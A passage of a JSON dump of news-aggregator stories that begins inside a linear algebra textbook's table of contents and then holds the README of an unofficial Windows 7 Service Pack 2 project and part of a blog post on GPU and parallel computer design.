Orthogonal Projections and Involutions   . . . . . . . . . . . . . . . . . . . .   541 14.7   Dual Norms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   544 14.8   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   551 14.9   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   552  15 Eigenvectors and Eigenvalues   557  15.1   Eigenvectors and Eigenvalues of a Linear Map . . . . . . . . . . . . . . . . .   557 15.2   Reduction to Upper Triangular Form . . . . . . . . . . . . . . . . . . . . . .   565 15.3   Location of Eigenvalues   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   569 15.4   Conditioning of Eigenvalue Problems . . . . . . . . . . . . . . . . . . . . . .   573 15.5   Eigenvalues of the Matrix Exponential . . . . . . . . . . . . . . . . . . . . .   575 15.6   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   577 15.7   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   578  16 Unit Quaternions and Rotations in SO (3)   589  16.1   The Group   SU (2) and the Skew Field   H   of Quaternions   . . . . . . . . . . .   589 16.2   Representation of Rotation in   SO (3) By Quaternions in   SU (2)   . . . . . . .   591 16.3   Matrix Representation of the Rotation   r q   . . . . . . . . . . . . . . . . . . .   596 16.4   An Algorithm to Find a Quaternion Representing a Rotation   . . . . . . . .   598 16.5   The Exponential Map exp :   su (2)   →   SU (2)   . . . . . . . . . . . . . . . . . .   601 16.6   Quaternion Interpolation   ~   . . . . . . . . . . . . . . . . . . . . . . . . . . .   604 16.7   Nonexistence of a “Nice” Section from   SO (3) to   SU (2) . . . . . . . . . . . .   606 16.8   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   608\n\nCONTENTS   7 16.9   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   609  17 Spectral Theorems   613  17.1   Introduction   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   613 17.2   Normal Linear Maps: Eigenvalues and Eigenvectors . . . . . . . . . . . . . .   613 17.3   Spectral Theorem for Normal Linear Maps . . . . . . . . . . . . . . . . . . .   619 17.4   Self-Adjoint and Other Special Linear Maps . . . . . . . . . . . . . . . . . .   624 17.5   Normal and Other Special Matrices . . . . . . . . . . . . . . . . . . . . . . .   630 17.6   Rayleigh–Ritz Theorems and Eigenvalue Interlacing   . . . . . . . . . . . . .   633 17.7   The Courant–Fischer Theorem; Perturbation Results . . . . . . . . . . . . .   638 17.8   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   641 17.9   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   642  18 Computing Eigenvalues and Eigenvectors   649  18.1   The Basic   QR   Algorithm   . . . . . . . . . . . . . . . . . . . . . . . . . . . .   651 18.2   Hessenberg Matrices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   657 18.3   Making the   QR   Method More Efficient Using Shifts   . . . . . . . . . . . . .   663 18.4   Krylov Subspaces; Arnoldi Iteration   . . . . . . . . . . . . . . . . . . . . . .   668 18.5   GMRES . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   672 18.6   The Hermitian Case; Lanczos Iteration . . . . . . . . . . . . . . . . . . . . .   673 18.7   Power Methods . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   674 18.8   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   676 18.9   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   677  19 Introduction to The Finite Elements Method   679  19.1   A One-Dimensional Problem: Bending of a Beam . . . . . . . . . . . . . . .   679 19.2   A Two-Dimensional Problem: An Elastic Membrane   . . . . . . . . . . . . .   690 19.3   Time-Dependent Boundary Problems . . . . . . . . . . . . . . . . . . . . . .   693  20 Graphs and Graph Laplacians; Basic Facts   701  20.1   Directed Graphs, Undirected Graphs, Weighted Graphs   . . . . . . . . . . .   704 20.2   Laplacian Matrices of Graphs . . . . . . . . . . . . . . . . . . . . . . . . . .   711 20.3   Normalized Laplacian Matrices of Graphs   . . . . . . . . . . . . . . . . . . .   715 20.4   Graph Clustering Using Normalized Cuts   . . . . . . . . . . . . . . . . . . .   719 20.5   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   721 20.6   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   722  21 Spectral Graph Drawing   725  21.1   Graph Drawing and Energy Minimization   . . . . . . . . . . . . . . . . . . .   725 21.2   Examples of Graph Drawings   . . . . . . . . . . . . . . . . . . . . . . . . . .   728 21.3   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   732  22 Singular Value Decomposition and Polar Form   735\n\n8   CONTENTS  22.1   Properties of   f   ∗   ◦   f   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   735 22.2   Singular Value Decomposition for Square Matrices   . . . . . . . . . . . . . .   741 22.3   Polar Form for Square Matrices . . . . . . . . . . . . . . . . . . . . . . . . .   745 22.4   Singular Value Decomposition for Rectangular Matrices   . . . . . . . . . . .   747 22.5   Ky Fan Norms and Schatten Norms   . . . . . . . . . . . . . . . . . . . . . .   751 22.6   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   752 22.7   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   752  23 Applications of SVD and Pseudo-Inverses   757  23.1   Least Squares Problems and the Pseudo-Inverse . . . . . . . . . . . . . . . .   757 23.2   Properties of the Pseudo-Inverse   . . . . . . . . . . . . . . . . . . . . . . . .   764 23.3   Data Compression and SVD . . . . . . . . . . . . . . . . . . . . . . . . . . .   769 23.4   Principal Components Analysis (PCA) . . . . . . . . . . . . . . . . . . . . .   771 23.5   Best Affine Approximation   . . . . . . . . . . . . . . . . . . . . . . . . . . .   782 23.6   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   786 23.7   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   787  II   Affine and Projective Geometry   791  24 Basics of Affine Geometry   793  24.1   Affine Spaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   793 24.2   Examples of Affine Spaces . . . . . . . . . . . . . . . . . . . . . . . . . . . .   802 24.3   Chasles’s Identity   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   803 24.4   Affine Combinations, Barycenters . . . . . . . . . . . . . . . . . . . . . . . .   804 24.5   Affine Subspaces   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   809 24.6   Affine Independence and Affine Frames . . . . . . . . . . . . . . . . . . . . .   815 24.7   Affine Maps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   821 24.8   Affine Groups . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   828 24.9   Affine Geometry: A Glimpse   . . . . . . . . . . . . . . . . . . . . . . . . . .   830 24.10 Affine Hyperplanes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   834 24.11 Intersection of Affine Spaces . . . . . . . . . . . . . . . . . . . . . . . . . . .   836  25 Embedding an Affine Space in a Vector Space   839  25.1   The “Hat Construction,” or Homogenizing . . . . . . . . . . . . . . . . . . .   839 25.2   Affine Frames of   E   and Bases of  ˆ E   . . . . . . . . . . . . . . . . . . . . . . .   846 25.3   Another Construction of  ˆ E   . . . . . . . . . . . . . . . . . . . . . . . . . . .   849 25.4   Extending Affine Maps to Linear Maps . . . . . . . . . . . . . . . . . . . . .   852  26 Basics of Projective Geometry   857  26.1   Why Projective Spaces? . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   857 26.2   Projective Spaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   862 26.3   Projective Subspaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   867\n\nCONTENTS   9 26.4   Projective Frames   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   870 26.5   Projective Maps   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   884 26.6   Finding a Homography Between Two Projective Frames   . . . . . . . . . . .   890 26.7   Affine Patches   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   903 26.8   Projective Completion of an Affine Space   . . . . . . . . . . . . . . . . . . .   906 26.9   Making Good Use of Hyperplanes at Infinity   . . . . . . . . . . . . . . . . .   911 26.10 The Cross-Ratio   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   914 26.11 Fixed Points of Homographies and Homologies   . . . . . . . . . . . . . . . .   918 26.12 Duality in Projective Geometry . . . . . . . . . . . . . . . . . . . . . . . . .   932 26.13 Cross-Ratios of Hyperplanes . . . . . . . . . . . . . . . . . . . . . . . . . . .   936 26.14 Complexification of a Real Projective Space . . . . . . . . . . . . . . . . . .   938 26.15 Similarity Structures on a Projective Space   . . . . . . . . . . . . . . . . . .   940 26.16 Some Applications of Projective Geometry . . . . . . . . . . . . . . . . . . .   949  III   The Geometry of Bilinear Forms   955  27 The Cartan–Dieudonn´ e Theorem   957  27.1   The Cartan–Dieudonn´ e Theorem for Linear Isometries   . . . . . . . . . . . .   957 27.2   Affine Isometries (Rigid Motions) . . . . . . . . . . . . . . . . . . . . . . . .   969 27.3   Fixed Points of Affine Maps . . . . . . . . . . . . . . . . . . . . . . . . . . .   971 27.4   Affine Isometries and Fixed Points   . . . . . . . . . . . . . . . . . . . . . . .   973 27.5   The Cartan–Dieudonn´ e Theorem for Affine Isometries   . . . . . . . . . . . .   979  28 Isometries of Hermitian Spaces   983  28.1   The Cartan–Dieudonn´ e Theorem, Hermitian Case . . . . . . . . . . . . . . .   983 28.2   Affine Isometries (Rigid Motions) . . . . . . . . . . . . . . . . . . . . . . . .   992  29 The Geometry of Bilinear Forms; Witt’s Theorem   997  29.1   Bilinear Forms   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   997 29.2   Sesquilinear Forms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1005 29.3   Orthogonality . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1009 29.4   Adjoint of a Linear Map . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1014 29.5   Isometries Associated with Sesquilinear Forms . . . . . . . . . . . . . . . . . 1016 29.6   Totally Isotropic Subspaces   . . . . . . . . . . . . . . . . . . . . . . . . . . . 1020 29.7   Witt Decomposition   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1026 29.8   Symplectic Groups . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1034 29.9   Orthogonal Groups and the Cartan–Dieudonn´ e Theorem . . . . . . . . . . . 1038 29.10 Witt’s Theorem   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1045\n\n10   CONTENTS  IV   Algebra: PID’s, UFD’s, Noetherian Rings, Tensors, Modules over a PID, Normal Forms   1051  30 Polynomials, Ideals and PID’s   1053  30.1   Multisets   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1053 30.2   Polynomials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1054 30.3   Euclidean Division of Polynomials   . . . . . . . . . . . . . . . . . . . . . . . 1060 30.4   Ideals, PID’s, and Greatest Common Divisors . . . . . . . . . . . . . . . . . 1062 30.5   Factorization and Irreducible Factors in   K [ X ] . . . . . . . . . . . . . . . . . 1070 30.6   Roots of Polynomials   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1074 30.7   Polynomial Interpolation (Lagrange, Newton, Hermite) . . . . . . . . . . . . 1081  31 Annihilating Polynomials; Primary Decomposition   1089  31.1   Annihilating Polynomials and the Minimal Polynomial . . . . . . . . . . . . 1091 31.2   Minimal Polynomials of Diagonalizable Linear Maps   . . . . . . . . . . . . . 1093 31.3   Commuting Families of Linear Maps   . . . . . . . . . . . . . . . . . . . . . . 1096 31.4   The Primary Decomposition Theorem   . . . . . . . . . . . . . . . . . . . . . 1099 31.5   Jordan Decomposition . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1105 31.6   Nilpotent Linear Maps and Jordan Form . . . . . . . . . . . . . . . . . . . . 1108 31.7   Summary   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1114 31.8   Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1115  32 UFD’s, Noetherian Rings, Hilbert’s Basis Theorem   1119  32.1   Unique Factorization Domains (Factorial Rings) . . . . . . . . . . . . . . . . 1119 32.2   The Chinese Remainder Theorem . . . . . . . . . . . . . . . . . . . . . . . . 1133 32.3   Noetherian Rings and Hilbert’s Basis Theorem   . . . . . . . . . . . . . . . . 1139 32.4   Futher Readings   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1143  33 Tensor Algebras   1145  33.1   Linear Algebra Preliminaries: Dual Spaces and Pairings   . . . . . . . . . . . 1147 33.2   Tensors Products . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1152 33.3   Bases of Tensor Products   . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1164 33.4   Some Useful Isomorphisms for Tensor Products   . . . . . . . . . . . . . . . . 1165 33.5   Duality for Tensor Products . . . . . . . . . . . . . . . . . . . . . . . . . . . 1169 33.6   Tensor Algebras   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1175 33.7   Symmetric Tensor Powers . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1182 33.8   Bases of Symmetric Powers   . . . . . . . . . . . . . . . . . . . . . . . . . . . 1186 33.9   Some Useful Isomorphisms for Symmetric Powers . . . . . . . . . . . . . . . 1189 33.10 Duality for Symmetric Powers . . . . . . . . . . . . . . . . . . . . . . . . . . 1189 33.11 Symmetric Algebras   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1193 33.12 Problems   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1196  34 Exterior Tensor Powers and Exterior Algebras   1199",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "0f9ecfa7eec46811",
    "title": {
      "en": "Unofficial Windows 7 Service Pack 2",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/i486girl/win7-sp2",
    "score": 44,
    "by": "XzetaU8",
    "time": 1742643903,
    "content": "Windows 7 Service Pack 2\nWarningThis project is far from finished, meaning that bugs are to be expected. If you encounter any bugs, please report them in the issue tracker or in the Discord server. Thank you for your understanding.\n\nWindows 7 Service Pack 2 is a package consisting of updates, tweaks, backported apps and overall enhancements with the goal of providing an effortless way to have a fully updated Windows 7 ISO and enhancing usability on semi-modern machines.\nTODOs\n\n - All updates until 2020, with the addition of Windows Embedded Standard 7 updates\n - Snipping Tool from Windows 10 version 1507 -> Credits: vxiduu\n - Paint from Windows 8 build 9425\n - Registry Editor from Windows 10 build 16212 -> Credits: Aurorarion\n - In-place service pack installer\n - Native USB 3.0 and NVMe support -> Credits: Unknown user from MyDigitalLife forums\n - TPM 2.0 support\n - UEFI support in the ISO releases, with EFI GOP support too -> Credits: Typical/int10h, AveragePC\n - Inclusion of VxKex -> Credits: vxiduu\n - Windows 8 PE in the ISO, with a theme that resembles Windows 7 -> Credits: ImSwordQueen (Windows 7 theme for Windows 8.x)\n - Windows 10 setup engine in the ISO release -> Credits: Aurorarion (helping out on the 10 setup engine port)\n - Builtin Webp and FLAC codecs\n - Task Manager from Windows 8 build 7880 -> Credits: Jevil7452\n - Upscaled graphics in some places\n - Windows Vista/7 PE's boot screen on the ISO -> Credits: Microsoft Corporation and Tech Stuff (Boot8Plus)\n - Removal of the annoying \"Unsupported hardware\" prompt\n - Better DPI support in aero.msstyles -> Credits: Vaporvance (high DPI classes from Aero10 that will be ported to Windows 7)\n - Integration of Microsoft Visual C++ Redistributable AIO -> Credits: Microsoft Corporation (Visual C++) and abbodi1406 (VC++ AIO repack)\n - Disk Cleanup from Windows 8 build 7861 -> Credits: Jevil7452\n - Windows 8 build 7861's PDF Reader -> Credits: Jevil7452\n - Windows 10 20H1's System Information -> Credits: Jevil7452\n - Windows 11 24H2's timeout.exe command\n - Windows 10 1709's XPS Viewer\n - Windows 11 24H2's sudo.exe command\n - Windows 10 build 9845's Notepad\n - Windows Management Framework 5.1\n - Segoe UI Emoji\n - Microsoft Agent\n - WinHlp32\n - Work Folders\n - Restore Windows Journal\n - Microsoft Camera Codec Pack\n\nInstallation\nCautionFailure to follow instructions properly will result in a bricked system! We do not take responsibility for this unless this is a legitimate bug in the installer!\n\nImportantRAID/Intel RST only works on specific systems!\n\nWarningBoth versions of the Windows 7 Service Pack 2 are x64 only! Don't file issues over the lack of 32-bit hardware support as we do not plan to support 32-bit hardware. Consult the FAQ for more information.\n\nISO installation\nImportantThe ISO releases are for clean installs only. For in-place installs, please use the installer once we release a working version of it.\n\nPick the UEFI or Legacy Boot version, depending on what your system uses\nFlash it onto a DVD or a USB flash drive\nBoot from the Windows 7 install media on the machine you wish to install it in\nProceed as usual\nFinish the out of box experience\n\nIn-place intallation\n\nDownload the Windows 7 SP2 installer under the releases of this repository\nFollow the steps in the installer as usual\n\nWarningIf the installer is stuck at a certain percentage (during the Upgrading Windows phase), don't turn off your computer! Doing so will brick your system!\n\nFAQ\nQ: My system is 32-bit in hardware. Why won't the installer and the ISO run?\nA: Supporting both 64-bit and 32-bit Windows would be very time consuming, so we chose to support only 64-bit systems. Please don't file any issues regarding the lack of 32-bit support as we have no interests of making any releases targeting 32-bit hardware.\nQ: Why don't you include ESU updates?\nA: ESU updates will be rolled out by Microsoft until 2026, and unfortunately adding ESU updates will be time consuming as it requires us to roll out new releases every time a batch of ESU updates gets rolled out.\nQ: Why VxKex instead of the dotexe1337 Windows 7 Extended Kernel?\nA: VxKex is safer than dotexe's Windows 7 Extended Kernel as it relies on external DLLs.\nQ: Does this include custom integrated GPU dri-\nA: NO\nQ: Why aren't my drives appearing in the Windows Setup screen?\nA: If you are using an RAID/RST configuration, it may well likely be that the drivers installed do not work.\nOther credits\n\nK4sum1: Inspiration for creating Windows 7 SP2\nGMM2003: \"Under construction\" wallpaper used in Public Beta builds\nOur contributors\nAnyone who reports bugs constantly",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "60e5facc16b537eb",
    "title": {
      "en": "I want a good parallel computer",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://raphlinus.github.io/gpu/2025/03/21/good-parallel-computer.html",
    "score": 200,
    "by": "raphlinus",
    "time": 1742586942,
    "content": "I want a good parallel computer\n\n      Mar 21, 2025\n\n    The GPU in your computer is about 10 to 100 times more powerful than the CPU, depending on workload. For real-time graphics rendering and machine learning, you are enjoying that power, and doing those workloads on a CPU is not viable. Why aren’t we exploiting that power for other workloads? What prevents a GPU from being a more general purpose computer?\n\nI believe there are two main things holding it back. One is an impoverished execution model, which makes certain tasks difficult or impossible to do efficiently; GPUs excel at big blocks of data with predictable shape, such as dense matrix multiplication, but struggle when the workload is dynamic. Second, our languages and tools are inadequate. Programming a parallel computer is just a lot harder.\n\nModern GPUs are also extremely complex, and getting more so rapidly. New features such as mesh shaders and work graphs are two steps forward one step back; for each new capability there is a basic task that isn’t fully supported.\n\nI believe a simpler, more powerful parallel computer is possible, and that there are signs in the historical record. In a slightly alternate universe, we would have those computers now, and be doing the work of designing algorithms and writing programs to run well on them, for a very broad range of tasks.\n\nLast April, I gave a colloquium (video) at the UCSC CSE program with the same title. This blog is a companion to that.\n\nMemory efficiency of sophisticated GPU programs\n\nI’ve been working on Vello, an advanced 2D vector graphics renderer, for many years. The CPU uploads a scene description in a simplified binary SVG-like format, then the compute shaders take care of the rest, producing a 2D rendered image at the end. The compute shaders parse tree structures, do advanced computational geometry for stroke expansion, and sorting-like algorithms for binning. Internally, it’s essentially a simple compiler, producing a separate optimized byte-code like program for each 16x16 pixel tile, then interpreting those programs. What it cannot do, a problem I am increasingly frustrated by, is run in bounded memory. Each stage produces intermediate data structures, and the number and size of these structures depends on the input in an unpredictable way. For example, changing a single transform in the encoded scene can result in profoundly different rendering plans.\n\nThe problem is that the buffers for the intermediate results need to be allocated (under CPU control) before kicking off the pipeline. There are a number of imperfect potential solutions. We could estimate memory requirements on the CPU before starting a render, but that’s expensive and may not be precise, resulting either in failure or waste. We could try a render, detect failure, and retry if buffers were exceeded, but doing readback from GPU to CPU is a big performance problem, and creates a significant architectural burden on other engines we’d interface with.\n\nThe details of the specific problem are interesting but beyond the scope of this blog post. The interested reader is directed to the Potato design document, which explores the question of how far you can get doing scheduling on CPU, respecting bounded GPU resources, while using the GPU for actual pixel wrangling. It also touches on several more recent extensions to the standard GPU execution model, all of which are complex and non-portable, and none of which quite seem to solve the problem.\n\nFundamentally, it shouldn’t be necessary to allocate large buffers to store intermediate results. Since they will be consumed by downstream stages, it’s far more efficient to put them in queues, sized large enough to keep enough items in flight to exploit available parallelism. Many GPU operations internally work as queues (the standard vertex shader / fragment shader / rasterop pipeline being the classic example), so it’s a question of exposing that underlying functionality to applications. The GRAMPS paper from 2009 suggests this direction, as did the Brook project, a predecessor to CUDA.\n\nThere are a lot of potential solutions to running Vello-like algorithms in bounded memory; most have a fatal flaw on hardware today. It’s interesting to speculate about changes that would unlock the capability. It’s worth emphasizing, I’m not feeling held back by the amount of parallelism I can exploit, as my approach of breaking the problem into variants of prefix sum easily scales to hundreds of thousands of threads. Rather, it’s the inability to organize the overall as stages operating in parallel, connected through queues tuned to use only the amount of buffer memory needed to keep everything smoothly, as opposed to the compute shader execution model of large dispatches separated by pipeline barriers.\n\nParallel computers of the past\n\nThe lack of a good parallel computer today is especially frustrating because there were some promising designs in the past, which failed to catch on for various complex reasons, leaving us with overly complex and limited GPUs, and extremely limited, though efficient, AI accelerators.\n\nConnection Machine\n\nI’m listing this not because it’s a particularly promising design, but because it expressed the dream of a good parallel computer in the clearest way. The first Connection Machine shipped in 1985, and contained up to 64k processors, connected in a hypercube network. The number of individual threads is large even by today’s standards, though each individual processor was extremely underpowered.\n\nPerhaps more than anything else, the CM spurred tremendous research into parallel algorithms. The pioneering work by Blelloch on prefix sum was largely done on the Connection Machine, and I find early paper on sorting on CM-2 to be quite fascinating.\n\nConnection Machine 1 (1985) at KIT / Informatics / TECO • by KIT TECO • CC0\n\nCell\n\nAnother important pioneering parallel computer was Cell, which shipped as part of the PlayStation 3 in 2006. That device shipped in fairly good volume (about 87.4 million units), and had fascinating applications including high performance computing, but was a dead end; the Playstation 4 switched to a fairly vanilla rendering pipeline based on a Radeon GPU.\n\nProbably one of the biggest challenges in the Cell was the programming model. In the version shipped on the PS3, there were 8 parallel cores, each with 256kB of static RAM, and each with 128 bit wide vector SIMD. The programmer had to manually copy data into local SRAM, where a kernel would then do some computation. There was little or no support for high level programming; thus people wanting to target this platform had to painstakingly architect and implement parallel algorithms.\n\nAll that said, the Cell basically met my requirements for a “good parallel computer.” The individual cores could run effectively arbitrary programs, and there was a global job queue.\n\nThe Cell had approximately 200 GFLOPS of total throughput, which was impressive at the time, but pales in comparison to modern GPUs or even a modern CPU (Intel i9-13900K is approximately 850 GFLOPS, with a medium-high end Ryzen 7 is 3379 GFLOPS).\n\nLarrabee\n\nPerhaps the most poignant road not taken in the history of GPU design is Larrabee. The 2008 SIGGRAPH paper makes a compelling case, but ultimately the project failed. It’s hard to say why exactly, but I think it’s possible it was just poor execution on Intel’s part, and with more persistence and a couple of iterations to improve the shortcomings in the original version, it might well have succeeded. At heart, Larrabee is a standard x86 computer with wide (512 bit) SIMD units and just a bit of special hardware to optimize graphics tasks. Most graphics functions are implemented in software. If it had succeeded, it would very easily fulfill my wishes; work creation and queuing is done in software and can be entirely dynamic at a fine level of granularity.\n\nBits of Larrabee live on. The upcoming AVX10 instruction set is an evolution of Larrabee’s AVX-512, and supports 32 lanes of f16 operations. In fact, Tom Forsyth, one of its creators, argues that Larrabee did not indeed fail but that its legacy is a success. It did ship in modest volumes as Xeon Phi. Another valuable facet of legacy is ISPC, and Matt Pharr’s blog on The story of ispc sheds light on the Larrabee project.\n\nLikely one of the problems of Larrabee was power consumption, which has emerged as one of the limiting factors in parallel computer performance. The fully coherent (total store order) memory hierarchy, while making software easier, also added to the cost of the system, and since then we’ve gained a lot of knowledge in how to write performant software in weaker memory models.\n\nAnother aspect that definitely held Larrabee back was the software, which is always challenging, especially for innovative directions. The drivers didn’t expose the special capabilities of the highly programmable hardware, and performance on traditional triangle-based 3D graphics scenes was underwhelming. Even so, it did quite well on CAD workloads involving lots of antialiased lines, driven by a standard OpenGL interface.\n\nThe changing workload\n\nEven within games, compute is becoming a much larger fraction of the total workload (for AI, it’s everything). Analysis of Starfield by Chips and Cheese shows that about half the time is in compute. The Nanite renderer also uses compute even for rasterization of small triangles, as hardware is only more efficient for triangles above a certain size. As games do more image filtering, global illumination, and primitives such as Gaussian splatting, the trend will almost certainly continue.\n\nIn 2009, Tim Sweeney gave a thought-provoking talk entitled The end of the GPU roadmap, in which he proposed that the concept of GPU would go away entirely, replaced by a highly parallel general purpose computer. That has not come to pass, though there has been some movement in that direction: the Larrabee project (as described above), the groundbreaking cudaraster paper from 2011 implemented the traditional 3D rasterization pipeline entirely in compute, and found (simplifying quite a bit) that it was about 2x slower than using fixed function hardware, and more recent academic GPU designs based on grids of RISC-V cores. It’s worth noting, a more recent update from Tellusim suggests that cudaraster-like rendering in compute can be close to parity on modern hardware.\n\nAn excellent 2017 presentation, Future Directions for Compute-for-Graphics by Andrew Lauritzen, highlighted many of the challenges of incorporating advanced compute techniques into graphics pipelines. There’s been some progress since then, but it speaks to many of the same problems I’m raising in this blog post. Also see comments by Josh Barczak, which also links the GRAMPS work and discusses issues with language support.\n\nPaths forward\n\nI can see a few ways to get from the current state to a good parallel computer. Each basically picks a starting point that might have been on the right track but got derailed.\n\nBig grid of cores: Cell reborn\n\nThe original promise of the Cell still has some appeal. A modern high end CPU chip has north of 100 billion transistors, while a reasonably competent RISC CPU can be made with orders of magnitude fewer. Why not place hundreds or even thousands of cores on a chip? For maximum throughput, put a vector (SIMD) unit on each core. Indeed, there are at least two AI accelerator chips based on this idea: Esperanto and Tenstorrent. I’m particularly interested in the latter because its software stack is open source.\n\nThat said, there are most definitely challenges. A CPU by itself isn’t enough, it also needs high bandwidth local memory and communications with other cores. One reason the Cell was so hard to program is that the local memory was small and needed to be managed explicitly - your program needed to do explicit transfers through the network to get data in and out. The trend in CPU (and GPU) design is to virtualize everything, so that there’s an abstraction of a big pool of memory that all the cores share. You’ll still want to make your algorithm cache-aware for performance, but if not, the program will still run. It’s possible a sufficiently smart compiler can adapt a high-level description of the problem to the actual hardware (and this is the approach taken by Tenstorrent’s TT-Buda stack, specialized to AI workloads). In analogy to exploiting instruction-level parallelism through VLIW, the Itanium stands as a cautionary tale.\n\nFrom my read of the Tenstorrent docs, the matrix unit is limited to just matrix multiplication and a few supporting operations such as transpose, so it’s not clear it would be a significant speedup for complex algorithms as needed in 2D rendering. But I think it’s worth exploring, to see how far it can be pushed, and perhaps whether practical extensions to the matrix unit to support permutations and so on would unlock more algorithms.\n\nMost of the “big grid of cores” designs are targeted toward AI acceleration, and for good reason: it is hungry for raw throughput with low power costs, so alternatives to traditional CPU approaches are appealing. See the New Silicon for Supercomputers talk by Ian Cutress for a great survey of the field.\n\nRunning Vulkan commands from GPU-side\n\nA relatively small delta to existing GPUs would be the ability to dispatch work from a controller mounted on the GPU and sharing address space with the shaders. In its most general form, users would be able to run threads on this controller that could run the full graphics API (for example, Vulkan). The programming model could be similar to now, just that the thread submitting work is running close to the compute units and therefore has dramatically lower latency.\n\nIn their earliest form, GPU’s were not distributed systems, they were co-processors, tightly coupled to the host CPU’s instruction stream. These days, work is issued to the GPU by the equivalent of async remote procedure calls, with end-to-end latency often as high as 100µs. This proposal essentially calls for a return to less of a distributed system model, where work can efficiently be issued on a much finer grain and with much more responsiveness to the data. For dynamic work creation, latency is the most important blocker.\n\nNote that GPU APIs are slowly inventing a more complex, more limited version of this anyway. While it’s not possible to run the Vulkan API directly from a shader, with a recent Vulkan extension (VK_EXT_device_generated_commands) it is possible to encode some commands into a command buffer from a shader. Metal has this capability as well (see gpuweb#431 for more details about portability). It’s worth noting that the ability to run indirect commands to recursively generate more work is one of the missing functions; it seems that the designers did not take Hofstadter to heart.\n\nIt is interesting to contemplate actually running Vulkan API directly from a shader. Since the Vulkan API is expressed in terms of C, one of the requirements is the ability to run C. This is being done on an experimental basis (see the vcc project), but is not yet practical. Of course, CUDA can run C. CUDA 12.4 also has support for conditional nodes, and as of 12.0 it had support for device graph launch, which reduces latency considerably.\n\nWork graphs\n\nWork graphs are a recent new extension to the GPU execution model. Briefly, the program is structured as a graph of nodes (kernel programs) and edges (queues) all running in parallel. As a node generates output, filling its output queues, the GPU dispatches kernels (at workgroup granularity) to process those outputs further. To a large extent, this is a modern reinvention of the GRAMPS idea.\n\nWhile exciting, and very likely useful for an increasing range of graphics tasks, work graphs also have serious limitations; I researched whether I could use them for the existing Vello design and found three major problems. First, they cannot easily express joins, where progress of a node is dependent on synchronized input from two different queues. Vello uses joins extensively, for example one kernel to compute a bounding box of a draw object (aggregating multiple path segments), and another to process the geometry within that bounding box. Second, there is no ordering guarantee between the elements pushed into a queue, and 2D graphics ultimately does require ordering (the whiskers of the tiger must be drawn over the tiger’s face). Third, work graphs don’t support variable-size elements.\n\nThe lack of an ordering guarantee is particularly frustrating, because the traditional 3D pipeline does maintain ordering, among other reasons, to prevent Z-fighting artifacts (for a fascinating discussion of how GPU hardware preserves the blend order 